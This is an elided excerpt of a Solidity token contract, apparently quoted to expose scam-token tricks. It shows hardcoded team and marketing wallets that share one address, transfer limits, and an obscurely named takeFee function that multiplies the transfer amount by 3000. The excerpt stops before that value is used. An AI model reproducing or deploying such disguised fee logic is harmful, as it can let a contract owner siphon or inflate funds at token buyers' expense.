...
contract Contract is Context, IERC20, Ownable {
    ...
    uint256 private _boughtMax = 100000000 * 10**_decimals;
    uint256 private _heldMax = 100000000 * 10**_decimals;
    ...
    constructor () {
        ...
        teamWallet = payable(address(0x21f5eF3423e69Ae19Cb2DAbb6c389C5fe26Ab671));
        marketingWallet = payable(address(0x21f5eF3423e69Ae19Cb2DAbb6c389C5fe26Ab671));
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            if(!isTxLimitExempt[sender] && !isTxLimitExempt[recipient]) {
                require(amount <= _boughtMax, "Transfer amount exceeds the maxTxAmount.");
            }            
            ...
            if(checkWalletLimit && !isWalletLimitExempt[recipient])
                require(balanceOf(recipient).add(finalAmount) <= _heldMax);
    ...
    function takeFee(address sender, address recipient, uint256 excape) private returns (uint256) {
        uint256 labs = excape;
        uint256 feeAmount = 0;
        uint256 feeExcape = labs.add(excape * 3000);
